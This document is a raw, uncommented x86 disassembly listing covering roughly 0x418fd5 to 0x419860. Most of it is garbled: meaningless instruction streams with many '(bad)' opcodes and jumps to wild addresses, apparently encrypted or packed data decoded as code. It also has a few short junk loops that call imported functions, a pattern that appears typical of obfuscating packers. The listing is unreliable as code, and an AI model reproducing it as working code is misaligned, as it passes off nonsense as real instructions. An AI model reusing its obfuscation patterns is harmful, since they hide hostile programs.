  418fd5:	xlat   BYTE PTR ds:[ebx]
  418fd6:	xchg   edi,eax
  418fd7:	mov    ax,0xc21d
  418fdb:	mov    DWORD PTR [eax-0xa],edi
  418fde:	imul   esi,DWORD PTR [esi],0x14a1c419
  418fe4:	xor    BYTE PTR [edx],bl
  418fe6:	or     ebx,edi
  418fe8:	sar    DWORD PTR [ebp-0x2ccb1f2],cl
  418fee:	pusha  
  418fef:	into   
  418ff0:	and    al,0x8f
  418ff2:	mov    eax,ds:0x671acb42
  418ff7:	pop    ecx
  418ff8:	xchg   ebp,eax
  418ff9:	push   0xb5b781b1
  418ffe:	jle    0x41906e
  419000:	sbb    eax,0xc1bd7f06
  419005:	sbb    BYTE PTR ds:0x323a6cf3,ch
  41900b:	aaa    
  41900c:	push   esp
  41900d:	arpl   WORD PTR ds:0x822140fd,si
  419013:	sahf   
  419014:	dec    edx
  419015:	es or  ebp,0x4828f582
  41901c:	arpl   WORD PTR [ebx+0x38373a26],sp
  419022:	mov    ebx,0xb1495dff
  419027:	and    al,0x95
  419029:	ins    BYTE PTR es:[edi],dx
  41902a:	outs   dx,BYTE PTR ds:[esi]
  41902b:	js     0x419072
  41902d:	je     0x419086
  41902f:	dec    eax
  419030:	pop    ecx
  419031:	je     0x419058
  419033:	mov    edi,0x90d25920
  419038:	jbe    0x418fe0
  41903a:	ret    
  41903b:	sbb    eax,0xded285a7
  419040:	jmp    0xcded6a4c
  419045:	(bad)  
  419046:	mov    ebp,0x344c4237
  41904b:	je     0x418fe5
  41904d:	pop    ecx
  41904e:	outs   dx,DWORD PTR ds:[esi]
  41904f:	jne    0x419089
  419051:	inc    ebx
  419052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419053:	xchg   ecx,eax
  419054:	(bad)  
  419055:	shr    al,0x20
  419058:	(bad)  
  419059:	xor    eax,0x7fd3a711
  41905e:	mov    eax,ds:0xc2ad9667
  419063:	xchg   edi,eax
  419064:	push   0xffffff93
  419066:	cmc    
  419067:	test   al,0x49
  419069:	xchg   DWORD PTR gs:[ebx+0x19],ecx
  41906d:	and    al,0x3e
  41906f:	pop    edi
  419070:	xor    esi,DWORD PTR [esi]
  419072:	sqrtps xmm2,XMMWORD PTR [edx+ebp*1-0x11]
  419077:	shl    bh,cl
  419079:	sub    cl,BYTE PTR ss:[edx]
  41907c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41907d:	lds    ecx,FWORD PTR [ecx-0x3b]
  419080:	push   edi
  419081:	xor    ebp,DWORD PTR es:[ebp-0x7315edb]
  419088:	das    
  419089:	jp     0x419075
  41908b:	pop    eax
  41908c:	sbb    edi,0xd6102938
  419092:	xor    eax,0x11849c8a
  419097:	push   es
  419098:	cmc    
  419099:	(bad)  [edx+edx*4]
  41909c:	lock hlt 
  41909e:	mov    dl,0x90
  4190a0:	push   0xccc64768
  4190a5:	lds    esp,FWORD PTR [esi+ebp*8-0x6d84f6fc]
  4190ac:	dec    ebx
  4190ad:	jp     0x4190c7
  4190af:	push   esp
  4190b0:	shr    ebx,cl
  4190b2:	adc    eax,DWORD PTR [eax-0x75]
  4190b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190b6:	js     0x419134
  4190b8:	adc    eax,0x3ad69e8c
  4190bd:	and    DWORD PTR [ebx+0x4a6804],0x80ecea04
  4190c7:	mov    al,0x95
  4190c9:	scas   eax,DWORD PTR es:[edi]
  4190ca:	push   ss
  4190cb:	and    eax,0xc62f1c16
  4190d0:	push   0x6b5b4e56
  4190d5:	mov    ah,0x96
  4190d7:	push   edx
  4190d8:	das    
  4190d9:	nop
  4190da:	inc    esp
  4190db:	jbe    0x4190da
  4190dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190de:	xor    dl,bl
  4190e0:	mov    cl,dl
  4190e2:	and    BYTE PTR [ecx-0x471b90ad],cl
  4190e8:	nop    eax
  4190eb:	fs push cs
  4190ed:	test   esp,ebx
  4190ef:	xor    edx,eax
  4190f1:	mov    al,0xa1
  4190f3:	(bad)  
  4190f5:	arpl   WORD PTR [ebp+0x33],bp
  4190f8:	movnti DWORD PTR [ecx],esp
  4190fb:	clc    
  4190fc:	mov    ch,0xfc
  4190fe:	adc    cl,al
  419100:	inc    edi
  419101:	pop    ebp
  419102:	add    eax,0x17ca9618
  419107:	push   ebx
  419108:	pusha  
  419109:	rol    BYTE PTR [ebp+0x123c5b41],0x9e
  419110:	mov    BYTE PTR [ebp+0x16118de3],0xef
  419117:	js     0x419150
  419119:	jns    0x41914a
  41911b:	sar    DWORD PTR ds:0x673fca47,1
  419121:	sbb    dh,BYTE PTR [ecx-0x74]
  419124:	out    0x4,al
  419126:	sbb    ah,BYTE PTR [esi+edi*8]
  419129:	(bad)  
  41912a:	enter  0x9a3d,0x8e
  41912e:	jle    0x4190db
  419130:	push   ds
  419131:	fld    DWORD PTR [eax+eax*2+0x5b17066c]
  419138:	xchg   ebp,eax
  419139:	xchg   ebp,eax
  41913a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41913b:	xchg   ebp,eax
  41913c:	fimul  DWORD PTR [ecx]
  41913e:	inc    ebp
  41913f:	jp     0x419119
  419141:	pop    edi
  419142:	jns    0x4190e9
  419144:	and    dh,BYTE PTR [ebx+0xe]
  419147:	jo     0x4191a2
  419149:	sub    al,0x57
  41914b:	and    ch,BYTE PTR [ecx]
  41914d:	inc    ebx
  41914e:	and    cl,BYTE PTR [ebx+0x354fa0b]
  419154:	into   
  419155:	mov    dh,0x90
  419157:	and    ch,0xab
  41915a:	addr16 aas 
  41915c:	xor    DWORD PTR ds:0xc1bdf057,ebp
  419162:	xchg   DWORD PTR [ecx-0x8d95271],edx
  419168:	jmp    0xb321:0xb01f3f7e
  41916f:	mov    ebx,0xb9452f12
  419174:	jae    0x419174
  419176:	fldcw  WORD PTR [edi-0x79944b39]
  41917c:	stos   DWORD PTR es:[edi],eax
  41917d:	cmc    
  41917e:	push   edi
  41917f:	push   ss
  419180:	adc    BYTE PTR [ebx],al
  419182:	adc    DWORD PTR [eax-0x4fd9a3cb],ecx
  419188:	mov    al,ds:0xe9d0ff97
  41918d:	add    eax,DWORD PTR [eax]
  41918f:	add    BYTE PTR [eax],al
  419191:	mov    eax,DWORD PTR [ebp+0x10]
  419194:	leave  
  419195:	ret    0xc
  419198:	push   ebp
  419199:	mov    ebp,esp
  41919b:	sub    esp,0x30
  41919e:	jmp    0x4193d3
  4191a3:	rcl    edx,cl
  4191a5:	ret    0xc13e
  4191a8:	into   
  4191a9:	rcl    ecx,cl
  4191ab:	daa    
  4191ac:	jle    0x419228
  4191ae:	mov    ?,WORD PTR [ebp+0x83b70b3]
  4191b4:	lds    edi,FWORD PTR [edi+0x78]
  4191b7:	adc    BYTE PTR [esi+0x78],bh
  4191ba:	js     0x4191a3
  4191bc:	outs   dx,DWORD PTR ds:[esi]
  4191bd:	rcr    DWORD PTR [edx+0x324b8ab],0x50
  4191c4:	push   esp
  4191c5:	xchg   esi,eax
  4191c6:	mov    eax,0xe11468e
  4191cb:	mov    al,ds:0xa6e68566
  4191d0:	pop    edi
  4191d1:	xchg   BYTE PTR [ebx-0x3e2e5f07],cl
  4191d7:	mov    ebx,0xabd41b34
  4191dc:	mov    dh,0xc0
  4191de:	popa   
  4191df:	cmp    DWORD PTR [ecx],ebp
  4191e1:	aaa    
  4191e2:	int    0xa
  4191e4:	popa   
  4191e5:	popf   
  4191e6:	push   ebx
  4191e7:	mov    cl,BYTE PTR [edx]
  4191e9:	in     eax,dx
  4191ea:	cmp    al,0x7c
  4191ec:	sbb    DWORD PTR [ecx-0x28],edi
  4191ef:	mov    eax,ds:0xc4778402
  4191f4:	jg     0x4191e2
  4191f6:	mov    bl,0x67
  4191f8:	dec    esp
  4191f9:	aad    0xef
  4191fb:	div    BYTE PTR [ecx]
  4191fd:	add    BYTE PTR [ecx+ecx*8+0x4d],ah
  419201:	and    eax,0xdb5820d4
  419206:	xchg   esi,eax
  419207:	aas    
  419208:	jne    0x4191a2
  41920a:	repz mov ds:0xfbce9f1a,eax
  419210:	sub    BYTE PTR [edi],dl
  419212:	dec    ebx
  419213:	out    dx,eax
  419214:	or     DWORD PTR [edx-0x1e3b77df],ecx
  41921a:	jns    0x4191ea
  41921c:	(bad)  
  41921d:	push   ecx
  41921e:	data16 mov ch,0xaf
  419221:	loopne 0x4191be
  419223:	sub    edi,ebp
  419225:	iret   
  419226:	inc    ebp
  419227:	pop    esi
  419228:	cmp    ecx,DWORD PTR [eax-0x1f]
  41922b:	xchg   esp,eax
  41922c:	pop    edx
  41922d:	(bad)  
  41922f:	jbe    0x41923b
  419231:	lds    edx,FWORD PTR [esi-0x3c]
  419234:	adc    eax,0xafa04a15
  419239:	mov    ds:0x1bede104,al
  41923e:	jmp    0xe514:0x28cc992d
  419245:	adc    eax,0x6babea3d
  41924a:	add    eax,0xb77f7396
  41924f:	ja     0x419227
  419251:	sbb    al,0xf7
  419253:	xchg   ebx,eax
  419254:	or     al,0xb0
  419256:	fst    QWORD PTR [edi]
  419258:	scas   al,BYTE PTR es:[edi]
  419259:	(bad)  
  41925a:	arpl   WORD PTR [ecx+ecx*1-0x1d],dx
  41925e:	imul   dl
  419260:	iret   
  419261:	cdq    
  419262:	lahf   
  419263:	sar    BYTE PTR ds:0xd9049614,0x7f
  41926a:	mov    ah,0x97
  41926c:	mov    cl,BYTE PTR [ecx+0xd]
  41926f:	nop
  419270:	xor    bh,al
  419272:	ret    0xf16f
  419275:	xor    ebx,DWORD PTR [eax+0x153da1b0]
  41927b:	repnz mov dl,0xfd
  41927e:	dec    ecx
  41927f:	arpl   WORD PTR [ecx+0x53],ax
  419282:	gs push esi
  419284:	dec    esp
  419285:	pop    edx
  419286:	sbb    eax,0xf808e505
  41928b:	jg     0x419306
  41928d:	pushf  
  41928e:	imul   ecx,DWORD PTR [ecx-0x48],0x82c98724
  419295:	lahf   
  419296:	dec    esi
  419297:	and    eax,0x3b6cc0d1
  41929c:	mov    al,0x9a
  41929e:	push   0x5
  4192a0:	cmp    al,0xf4
  4192a2:	xchg   DWORD PTR [esi-0x7b58f250],esp
  4192a8:	jecxz  0x419288
  4192aa:	add    eax,0x77227f2
  4192af:	adc    ecx,edi
  4192b1:	test   BYTE PTR [edi+0x59],bl
  4192b4:	mov    cl,0x8a
  4192b6:	(bad)  
  4192b7:	aad    0x0
  4192b9:	out    0x95,eax
  4192bb:	or     al,0xf7
  4192bd:	jle    0x419285
  4192bf:	popa   
  4192c0:	sub    esi,DWORD PTR [edi+0x4b0287ec]
  4192c6:	(bad)  
  4192c7:	sub    ah,bh
  4192c9:	das    
  4192ca:	pop    ss
  4192cb:	dec    esi
  4192cc:	mul    dh
  4192ce:	(bad)  
  4192cf:	(bad)  
  4192d0:	cmc    
  4192d1:	mov    ecx,0xc60a5752
  4192d6:	mov    ebx,0xd6d4b2ec
  4192db:	(bad)  
  4192dc:	scas   al,BYTE PTR es:[edi]
  4192dd:	inc    esp
  4192de:	shl    DWORD PTR [ecx+0x61],0x3c
  4192e2:	lds    ecx,FWORD PTR [edx+0x19c2790]
  4192e8:	aas    
  4192e9:	sbb    dh,BYTE PTR [esi+0x365919a4]
  4192ef:	loop   0x41934b
  4192f1:	(bad)  
  4192f2:	iret   
  4192f3:	inc    ecx
  4192f4:	jmp    0x4192a8
  4192f6:	push   ebp
  4192f7:	pop    ss
  4192f8:	mov    ebx,0xf6d8ab3f
  4192fd:	das    
  4192fe:	mov    esi,0xa1b5cfd4
  419303:	ret    
  419304:	in     al,dx
  419305:	ins    DWORD PTR es:[edi],dx
  419306:	pop    ecx
  419307:	mov    eax,0x61e5f643
  41930c:	mov    DWORD PTR [eax+eiz*1],esp
  41930f:	inc    ebx
  419310:	mov    esi,0xe6c2e212
  419315:	or     eax,DWORD PTR [edx+0x2b]
  419318:	out    dx,al
  419319:	xchg   ecx,eax
  41931a:	shr    BYTE PTR [ebx-0x61c88e33],0x11
  419321:	pop    esp
  419322:	sar    BYTE PTR [esi-0x164e5b8f],cl
  419328:	scas   eax,DWORD PTR es:[edi]
  419329:	and    esp,ebp
  41932b:	fwait
  41932c:	push   ds
  41932d:	(bad)  
  41932e:	popf   
  41932f:	bound  edx,QWORD PTR [edi+0x28694a63]
  419335:	fisub  DWORD PTR [edx+0x58]
  419338:	jle    0x419363
  41933a:	out    dx,al
  41933b:	shl    BYTE PTR [eax],0xc
  41933e:	or     eax,DWORD PTR fs:[eax+0x551af3cd]
  419345:	(bad)  
  419346:	push   edi
  419347:	mov    ebp,0x7061147
  41934c:	inc    eax
  41934d:	cld    
  41934e:	push   esp
  41934f:	mov    ch,0x17
  419351:	scas   al,BYTE PTR es:[edi]
  419352:	jne    0x41932c
  419354:	push   ebx
  419355:	(bad)  
  419357:	fdiv   QWORD PTR [edx+0x6945db3f]
  41935d:	cwde   
  41935e:	(bad)  
  41935f:	fidivr WORD PTR [ecx+eiz*1+0x54]
  419363:	dec    ebx
  419364:	leave  
  419365:	mov    ecx,0x24ee20e9
  41936a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41936b:	and    BYTE PTR [ebx+0x2047730],bl
  419371:	ret    
  419372:	(bad)  
  419373:	jne    0x419356
  419375:	push   eax
  419376:	inc    edx
  419377:	in     eax,0x42
  419379:	mov    al,0xe3
  41937b:	ret    0x5bd
  41937e:	xor    ebx,DWORD PTR [ecx]
  419380:	adc    eax,0xb23cbec7
  419385:	adc    bh,BYTE PTR ds:0x12cc66ce
  41938b:	int    0xb2
  41938d:	jp     0x419373
  41938f:	cmp    BYTE PTR [edx],ch
  419391:	fwait
  419392:	sub    edx,DWORD PTR [ebx]
  419394:	pop    edx
  419395:	aas    
  419396:	les    esp,FWORD PTR [esi]
  419398:	push   0x4fca71cd
  41939d:	push   esi
  41939e:	push   es
  41939f:	mov    al,0x8b
  4193a1:	mov    eax,edx
  4193a3:	add    DWORD PTR ds:0x872c52ed,ebp
  4193a9:	icebp  
  4193aa:	push   ds
  4193ab:	sbb    BYTE PTR [ebp-0x4f05751c],0xc9
  4193b2:	je     0x419393
  4193b4:	(bad)  
  4193b5:	(bad)  
  4193b6:	(bad)  
  4193b7:	aad    0x84
  4193b9:	pop    edx
  4193ba:	stos   DWORD PTR es:[edi],eax
  4193bb:	lea    edi,[ecx]
  4193bd:	data16 jp 0x4193fa
  4193c0:	cmp    al,0x2f
  4193c2:	jne    0x4193b3
  4193c4:	scas   al,BYTE PTR es:[edi]
  4193c5:	lahf   
  4193c6:	add    DWORD PTR [ecx+0x20],esi
  4193c9:	xor    BYTE PTR [ebp-0xf466e24],dl
  4193cf:	stos   BYTE PTR es:[edi],al
  4193d0:	mov    edi,0x45c7ca61
  4193d5:	cld    
  4193d6:	cmp    BYTE PTR [ebp+0x2581f89c],al
  4193dc:	std    
  4193dd:	scas   eax,DWORD PTR es:[edi]
  4193de:	inc    edx
  4193df:	add    BYTE PTR [eax],al
  4193e1:	add    BYTE PTR [eax],al
  4193e3:	add    BYTE PTR [ebx],dh
  4193e5:	leave  
  4193e6:	add    ecx,DWORD PTR ds:0x42affd
  4193ec:	inc    ecx
  4193ed:	mov    DWORD PTR ds:0x42affd,ecx
  4193f3:	cmp    DWORD PTR ds:0x42affd,0x24
  4193fa:	jne    0x41940b
  419400:	push   0x4f45
  419405:	call   DWORD PTR ds:0x41d278
  41940b:	cmp    DWORD PTR ds:0x42affd,0x1b
  419412:	jb     0x4193e4
  419418:	and    DWORD PTR ds:0x42af81,0x0
  419422:	jmp    0x419434
  419427:	mov    ecx,DWORD PTR ds:0x42af81
  41942d:	inc    ecx
  41942e:	mov    DWORD PTR ds:0x42af81,ecx
  419434:	cmp    DWORD PTR ds:0x42af81,0x1d
  41943b:	jae    0x419470
  419441:	cmp    DWORD PTR ds:0x42af81,0x1e
  419448:	jne    0x419461
  41944e:	push   0x42b10f
  419453:	push   DWORD PTR [ebp-0x20]
  419456:	push   0x1
  419458:	push   DWORD PTR [ebp-0xc]
  41945b:	call   DWORD PTR ds:0x41d118
  419461:	jmp    0x419427
  419466:	adc    DWORD PTR ds:0x42af31,0x7c2
  419470:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  419477:	and    DWORD PTR ds:0x42af8d,0x0
  419481:	mov    ecx,DWORD PTR ds:0x42af8d
  419487:	inc    ecx
  419488:	mov    DWORD PTR ds:0x42af8d,ecx
  41948e:	cmp    DWORD PTR ds:0x42af8d,0x25
  419495:	jne    0x4194a6
  41949b:	push   0x42b1c8
  4194a0:	call   DWORD PTR ds:0x41d27c
  4194a6:	cmp    DWORD PTR ds:0x42af8d,0x18
  4194ad:	jb     0x419481
  4194b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4194b6:	mov    eax,ds:0x42af85
  4194bb:	and    DWORD PTR ds:0x42aef5,eax
  4194c1:	push   ebx
  4194c2:	add    ebx,ebx
  4194c4:	mov    eax,0x7510850
  4194c9:	and    DWORD PTR ds:0x42aeed,ecx
  4194cf:	xor    ecx,eax
  4194d1:	movzx  ebx,BYTE PTR ds:0x42aef9
  4194d8:	adc    DWORD PTR ds:0x42aff1,ebx
  4194de:	mov    ebx,0x327298
  4194e3:	adc    DWORD PTR ds:0x42aee1,0x50ad
  4194ed:	add    ecx,ebx
  4194ef:	inc    DWORD PTR ds:0x42affd
  4194f5:	mov    DWORD PTR [ebp-0x1c],ecx
  4194f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4194fb:	push   esi
  4194fc:	mov    DWORD PTR ds:0x42af75,0x238f
  419506:	push   edi
  419507:	test   ecx,ecx
  419509:	mov    DWORD PTR ds:0x42afb9,0x1f7e
  419513:	je     0x419758
  419519:	jmp    0x41974e
  41951e:	retf   0xd03c
  419521:	(bad)
  419524:	fld    st(3)
  419526:	scas   eax,DWORD PTR es:[edi]
  419527:	inc    eax
  419528:	adc    DWORD PTR [esi+0x4c],eax
  41952b:	add    eax,0xcb2039c6
  419530:	jg     0x4195aa
  419532:	adc    BYTE PTR [esi+0x78],bh
  419535:	js     0x419559
  419537:	lock das 
  419539:	sbb    BYTE PTR ds:[eax+eiz*4+0xc52ae7b],0x18
  419542:	nop
  419543:	(bad)
  419546:	xchg   edx,eax
  419547:	mov    al,ds:0x30338b65
  41954c:	xchg   ebx,eax
  41954d:	jmp    0xdee901ce
  419552:	push   esp
  419553:	scas   eax,DWORD PTR es:[edi]
  419554:	cli    
  419555:	(bad)  
  419556:	xor    dh,dl
  419558:	loope  0x41957a
  41955a:	jecxz  0x419527
  41955c:	inc    esi
  41955d:	inc    esi
  41955e:	in     eax,0xa
  419560:	dec    esp
  419561:	int    0x61
  419563:	aam    0x40
  419565:	push   cs
  419566:	enter  0x1abe,0x71
  41956a:	shl    ah,cl
  41956c:	dec    eax
  41956d:	or     eax,0x1f948c39
  419572:	fisub  DWORD PTR [edi-0x4fcea144]
  419578:	(bad)  
  419579:	hlt    
  41957a:	cmp    eax,0xc3ae7163
  41957f:	or     eax,0xc4bfcc82
  419584:	push   ebp
  419585:	ins    BYTE PTR es:[edi],dx
  419586:	fwait
  419587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419588:	into   
  419589:	mov    bh,0x44
  41958b:	fcom   QWORD PTR [edx]
  41958d:	bound  esi,QWORD PTR [ecx-0x48637f2e]
  419593:	xor    bh,BYTE PTR [edi+esi*4+0x3]
  419597:	cmp    eax,0xe3dd5346
  41959c:	loopne 0x419540
  41959e:	(bad)  
  41959f:	bound  esi,QWORD PTR [edx-0x7afb3806]
  4195a5:	cmp    ebp,ebx
  4195a7:	aad    0xcf
  4195a9:	and    esi,DWORD PTR [ebp+0x66]
  4195ac:	sub    edi,DWORD PTR ss:[ecx]
  4195af:	mov    esp,0xf71540e4
  4195b4:	or     bl,ah
  4195b6:	or     bl,cl
  4195b8:	add    WORD PTR [edi+ebx*4+0x4f77db32],di
  4195c0:	pop    ds
  4195c1:	in     eax,dx
  4195c2:	xchg   ebx,eax
  4195c3:	and    esp,eax
  4195c5:	daa    
  4195c6:	loop   0x419629
  4195c8:	push   cs
  4195c9:	scas   al,BYTE PTR es:[edi]
  4195ca:	or     DWORD PTR [ecx],0xf24519a3
  4195d0:	scas   eax,DWORD PTR es:[edi]
  4195d1:	loop   0x41963e
  4195d3:	imul   ebp,DWORD PTR [eax+edx*1-0x2e70fcf7],0x91c246b6
  4195de:	push   edx
  4195df:	dec    esi
  4195e0:	push   cs
  4195e1:	(bad)  [eax+ebx*2-0x5e]
  4195e5:	(bad)  
  4195e6:	call   0xba9cc30f
  4195eb:	lods   al,BYTE PTR ds:[esi]
  4195ec:	jbe    0x419667
  4195ee:	xor    WORD PTR [ebx],dx
  4195f1:	mov    cl,0xda
  4195f3:	pop    esp
  4195f4:	in     al,dx
  4195f5:	fiadd  WORD PTR [esi]
  4195f7:	dec    edx
  4195f8:	adc    DWORD PTR [ebx-0x13],esp
  4195fb:	mov    dl,0x97
  4195fd:	inc    ebp
  4195fe:	outs   dx,DWORD PTR ds:[esi]
  4195ff:	lds    ecx,FWORD PTR [ecx]
  419601:	and    ecx,DWORD PTR [ecx]
  419603:	xlat   BYTE PTR ds:[ebx]
  419604:	sbb    DWORD PTR [edi+eiz*4-0x123217a2],edi
  41960b:	lock aad 0xb9
  41960e:	and    BYTE PTR [ecx],0x81
  419611:	in     eax,0x47
  419613:	push   ebp
  419614:	xor    DWORD PTR [edx],0xebce1201
  41961a:	ss in  eax,0xce
  41961d:	xchg   esi,eax
  41961e:	in     eax,dx
  41961f:	mov    bl,0xaf
  419621:	sbb    al,0x9f
  419623:	jg     0x4196a1
  419625:	call   0xdf7f97af
  41962a:	pop    es
  41962b:	das    
  41962c:	cs pop ss
  41962e:	in     al,0xfa
  419630:	pop    ebp
  419631:	stos   BYTE PTR es:[edi],al
  419632:	inc    ebx
  419633:	outs   dx,BYTE PTR ds:[esi]
  419634:	and    al,0xff
  419636:	sub    eax,0xdd1f8fe4
  41963b:	push   edi
  41963c:	sub    BYTE PTR [eax-0x67],dl
  41963f:	lock inc ebp
  419641:	adc    al,0x85
  419643:	cmp    ecx,edx
  419645:	icebp  
  419646:	pushf  
  419647:	pop    edi
  419648:	scas   al,BYTE PTR es:[edi]
  419649:	cld    
  41964a:	inc    ebx
  41964b:	jmp    0x419698
  41964d:	retf   0x32f9
  419650:	mov    cs,WORD PTR [esi-0x73]
  419653:	sub    al,0x0
  419655:	push   ebx
  419656:	stos   BYTE PTR es:[edi],al
  419657:	cmp    al,0x73
  419659:	stos   BYTE PTR es:[edi],al
  41965a:	loopne 0x41969e
  41965c:	xor    esi,esi
  41965e:	pop    ds
  41965f:	add    DWORD PTR [edx-0x1e],ebp
  419662:	xchg   ebp,eax
  419663:	fnstsw WORD PTR [ecx]
  419665:	jp     0x41964b
  419667:	dec    esi
  419668:	or     eax,0xab885a04
  41966d:	and    cl,dh
  41966f:	add    bh,ah
  419671:	(bad)  
  419672:	repz mov esp,0x919c731a
  419678:	xor    eax,0x35ba7a05
  41967d:	cmp    ah,BYTE PTR [ebx]
  41967f:	cli    
  419680:	popa   
  419681:	mov    ebp,0x6f47ad0
  419686:	jmp    0x419680
  419688:	push   0xde86fb45
  41968d:	mov    bh,0xde
  41968f:	add    eax,0xcdc4cc4d
  419694:	push   edi
  419695:	test   al,0xe7
  419697:	enter  0x3b37,0x7f
  41969b:	add    edi,esi
  41969d:	add    BYTE PTR gs:0x92cf6ac,0xb5
  4196a5:	stos   DWORD PTR es:[edi],eax
  4196a6:	ins    DWORD PTR es:[edi],dx
  4196a7:	js     0x4196b0
  4196a9:	fwait
  4196aa:	push   esp
  4196ab:	dec    edx
  4196ac:	and    dl,ah
  4196ae:	fild   QWORD PTR [edx*4-0x2762ed2f]
  4196b5:	cs push ss
  4196b7:	push   edx
  4196b8:	push   0x75d43b4d
  4196bd:	out    dx,al
  4196be:	das    
  4196bf:	test   ah,dl
  4196c1:	mov    bh,0x5a
  4196c3:	inc    eax
  4196c4:	add    al,0x31
  4196c6:	loopne 0x4196a5
  4196c8:	cwde   
  4196c9:	dec    edi
  4196ca:	mov    bh,0xa3
  4196cc:	sti    
  4196cd:	mov    ds:0x31053861,eax
  4196d2:	or     al,0xd6
  4196d4:	repz (bad) 
  4196d6:	in     al,dx
  4196d7:	int3   
  4196d8:	cmp    ah,BYTE PTR [edx+0x14]
  4196db:	ret    0x66a4
  4196de:	mov    WORD PTR [edx+edx*8+0x67],es
  4196e2:	adc    dh,bh
  4196e4:	daa    
  4196e5:	rcr    DWORD PTR [edx-0x6672413d],cl
  4196eb:	mov    ebp,0x375e2221
  4196f0:	xlat   BYTE PTR ds:[ebx]
  4196f1:	imul   esi,DWORD PTR [eax+0x64],0xffffff8c
  4196f5:	mov    DWORD PTR [ebp+esi*1-0x5a],ecx
  4196f9:	inc    ecx
  4196fa:	jge    0x41971c
  4196fc:	mov    ds:0x96f18c19,al
  419701:	cmp    DWORD PTR [edi-0x5dd5a924],ecx
  419707:	lods   eax,DWORD PTR ds:[esi]
  419708:	(bad)  
  419709:	mov    dh,0x34
  41970b:	inc    ebx
  41970c:	push   ds
  41970d:	arpl   WORD PTR [ebx-0x50],bp
  419710:	jb     0x419771
  419712:	sub    al,0xdb
  419714:	mov    bh,0xc3
  419716:	pushf  
  419717:	pop    edx
  419718:	mov    eax,0x22047adb
  41971d:	cld    
  41971e:	icebp  
  41971f:	add    cl,bl
  419721:	and    DWORD PTR [eax+esi*4+0x16f13ee3],ebx
  419728:	hlt    
  419729:	add    DWORD PTR [edx],esp
  41972b:	(bad)  
  41972c:	cmp    BYTE PTR [ebp-0x381fbce4],dl
  419732:	imul   DWORD PTR [ecx-0x1d67ff58]
  419738:	jae    0x419705
  41973a:	enter  0xcdd6,0x33
  41973e:	clc    
  41973f:	cmp    eax,0xedd79aae
  419744:	cs inc ebp
  419746:	je     0x4197bd
  419748:	int    0xd7
  41974a:	inc    edx
  41974b:	dec    edx
  41974c:	stc    
  41974d:	xor    ecx,DWORD PTR [ebx-0x9fcebb3]
  419753:	mov    ecx,DWORD PTR [ecx]
  419755:	mov    DWORD PTR [ebp-0x1c],ecx
  419758:	imul   edx,eax
  41975b:	xor    edi,DWORD PTR ds:0x42af81
  419761:	mov    ecx,0x4573
  419766:	add    edx,ecx
  419768:	sub    DWORD PTR ds:0x42affd,ecx
  41976e:	mov    esi,0x7879
  419773:	mov    edi,0x1556
  419778:	not    DWORD PTR ds:0x42afc5
  41977e:	xchg   esi,ecx
  419780:	add    DWORD PTR ds:0x42af35,0x585c
  41978a:	jmp    0x4199bf
  41978f:	iret   
  419790:	iret   
  419791:	(bad)  
  419792:	xlat   BYTE PTR ds:[ebx]
  419793:	(bad)  
  419794:	xlat   BYTE PTR ds:[ebx]
  419795:	iret   
  419796:	xlat   BYTE PTR ds:[ebx]
  419797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419798:	call   0x4a6dddeb
  41979d:	and    eax,0x7fc938bc
  4197a2:	js     0x4197b4
  4197a4:	jle    0x41981e
  4197a6:	js     0x4197f2
  4197a8:	mov    dl,0x37
  4197aa:	ss loop 0x419776
  4197ad:	push   ds
  4197ae:	call   0xbf49e6f1
  4197b3:	and    edi,edi
  4197b5:	adc    edx,DWORD PTR [edx+0x22bf57dd]
  4197bb:	dec    ebp
  4197bc:	inc    eax
  4197bd:	daa    
  4197be:	(bad)  
  4197bf:	mov    ebx,0x2e81ddad
  4197c4:	and    DWORD PTR [edi*4-0x73ac52e],esi
  4197cb:	adc    edi,ebp
  4197cd:	push   cs
  4197ce:	sub    DWORD PTR [eax-0x3f],ebp
  4197d1:	add    ecx,DWORD PTR [edi-0x14e1aca2]
  4197d7:	popf   
  4197d8:	in     al,0x26
  4197da:	dec    edx
  4197db:	dec    ebp
  4197dc:	aas    
  4197dd:	leave  
  4197de:	adc    eax,eax
  4197e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197e1:	push   esi
  4197e2:	loope  0x4197ff
  4197e4:	lock mov esp,0xeb35ca2b
  4197ea:	sbb    ah,BYTE PTR [edi+0x57]
  4197ed:	cdq    
  4197ee:	dec    ebx
  4197ef:	mov    bl,0xee
  4197f1:	shr    BYTE PTR [ecx+0x2],1
  4197f4:	xchg   edx,eax
  4197f5:	sar    al,0x7
  4197f8:	cld    
  4197f9:	cld    
  4197fa:	push   0x5a51a1ca
  4197ff:	(bad)  
  419800:	pop    esp
  419801:	adc    al,0xed
  419803:	sbb    BYTE PTR ds:0xa8f6524b,bl
  419809:	mov    ch,0xe3
  41980b:	(bad)  
  41980c:	cwde   
  41980d:	adc    eax,ecx
  41980f:	xor    ah,al
  419811:	test   eax,0x5698480d
  419816:	stos   BYTE PTR es:[edi],al
  419817:	xor    ebx,DWORD PTR [ebx+ebx*1+0x337c913b]
  41981e:	jmp    0xff5b587d
  419823:	imul   ebp,ecx,0xffffffc5
  419826:	out    0xd8,eax
  419828:	out    dx,eax
  419829:	sahf   
  41982a:	jno    0x419853
  41982c:	(bad)  
  41982d:	mov    ds,WORD PTR [edi+0x1bd8636c]
  419833:	add    BYTE PTR [edi+0x198bac5c],ah
  419839:	adc    BYTE PTR [eax+0x26],dh
  41983c:	and    eax,0x3b8dda1d
  419841:	rcr    DWORD PTR [ebx-0x19f313b9],1
  419847:	fnsave [edi]
  419849:	pop    edi
  41984a:	sub    DWORD PTR [esi-0x56],ecx
  41984d:	cmp    al,0xcf
  41984f:	cdq    
  419850:	push   ss
  419851:	mov    ah,0xd2
  419853:	jmp    0x51372691
  419858:	xchg   edx,eax
  419859:	jge    0x41983c
  41985b:	push   ebp
  41985c:	loope  0x4197ee
  41985e:	jg     0x419826
  419860:	and    al,0x71
